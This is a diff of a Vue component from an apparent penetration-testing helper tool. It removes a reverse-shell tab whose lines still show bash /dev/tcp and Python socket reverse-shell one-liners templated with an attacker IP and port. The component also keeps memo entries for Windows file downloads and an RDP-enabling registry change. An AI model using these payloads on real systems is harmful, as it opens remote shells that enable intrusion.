@@ -1,46 +1,30 @@
 <template>
     <div class="flex-box">
-        <el-tabs type="border-card" style="width: 50vh;" :stretch="true">
-            <el-tab-pane label="备忘录">
-                <el-button-group style="margin-bottom: 10px; width: 100%;">
-                    <el-button type="primary" style="width: 50%;" @click="dialog = true">添加</el-button>
-                    <el-button type="primary" style="width: 50%;" @click="
-            save()
-        ElNotification({
-            message: 'Save successfully',
-            type: 'success',
-            position: 'bottom-right',
-        });
-        ">保存</el-button>
-                </el-button-group>
-                <el-table :data="data.memo" border highlight-current-row :show-header="false"
-                    @current-change="handleChange" style="height: 75vh;">
-                    <el-table-column prop="label" />
-                    <el-table-column align="center" width="80">
-                        <template #default="scope">
-                            <el-button link type="primary" size="small" @click.prevent="deleteRow(scope.$index)">
-                                移除
-                            </el-button>
-                        </template>
-                    </el-table-column>
-                </el-table>
-            </el-tab-pane>
-            <el-tab-pane label="反弹shell">
-                <el-space style="display: flex; margin-bottom: 10px;">
-                    <el-input v-model="reverse.ip" @input="watchReverse(data.reverse[reverse.currentID])">
-                        <template #prepend>IP:</template>
-                    </el-input>
-                    <el-input v-model="reverse.port" @input="watchReverse(data.reverse[reverse.currentID])">
-                        <template #prepend>PORT:</template>
-                    </el-input>
-                </el-space>
-                <el-table :data="data.reverse" border highlight-current-row :show-header="false"
-                    @current-change="watchReverse" style="height: 75vh;">
-                    <el-table-column prop="label" />
-                </el-table>
-            </el-tab-pane>
-        </el-tabs>
-        <div style="width: 70%; margin-left: 20px;">
+        <div style="width: 50vh">
+            <el-button-group style="margin-bottom: 10px; width: 100%;">
+                <el-button type="primary" style="width: 50%;" @click="dialog = true">添加</el-button>
+                <el-button type="primary" style="width: 50%;" @click="
+                    save()
+                ElNotification({
+                    message: 'Save successfully',
+                    type: 'success',
+                    position: 'bottom-right',
+                });
+                ">保存</el-button>
+            </el-button-group>
+            <el-table :data="data.memo" border highlight-current-row :show-header="false" @current-change="handleChange"
+                style="height: 85vh;">
+                <el-table-column prop="label" />
+                <el-table-column align="center" width="80">
+                    <template #default="scope">
+                        <el-button link type="primary" size="small" @click.prevent="deleteRow(scope.$index)">
+                            移除
+                        </el-button>
+                    </template>
+                </el-table-column>
+            </el-table>
+        </div>
+        <div style="width: 70%; margin-left: 10px;">
             <pre class="pretty-response" style="margin: 0; height: auto;"><code>{{ reverse.show }}</code></pre>
             <el-button type="primary" style="float: right; margin-top: 10px;"
                 @click="ClipboardSetText(reverse.show)">复制</el-button>
@@ -98,28 +82,6 @@ const reverse = reactive({
 })
 
 var data = reactive({
-    reverse: [
-        {
-            label: "Bash -i",
-            value: `sh -i >& /dev/tcp/{reverse.ip}/{reverse.port} 0>&1`,
-        },
-        {
-            label: "Bash 196",
-            value: `0<&196;exec 196<>/dev/tcp/{reverse.ip}/{reverse.port}; sh <&196 >&196 2>&196`,
-        },
-        {
-            label: "Bash read line",
-            value: `exec 5<>/dev/tcp/{reverse.ip}/{reverse.port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
-        },
-        {
-            label: "Bash 5",
-            value: `sh -i 5<> /dev/tcp/{reverse.ip}/{reverse.port} 0<&5 1>&5 2>&5`,
-        },
-        {
-            label: "Python3",
-            value: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{reverse.ip}",{reverse.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
-        },
-    ],
     memo: [
         {
             label: "Windows下载文件",
@@ -178,16 +140,6 @@ REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnec
         },
     ]
 })
-
-function watchReverse(row: any) {
-    reverse.currentID = getLabelIndex(row.label)
-    reverse.show = row.value.replaceAll("{reverse.ip}", reverse.ip).replaceAll("{reverse.port}", reverse.port);
-}
-
-function getLabelIndex(label: string) {
-    return data.reverse.findIndex(item => item.label === label);
-}
-
 
 function handleChange(row: any) {
     reverse.show = row.value;
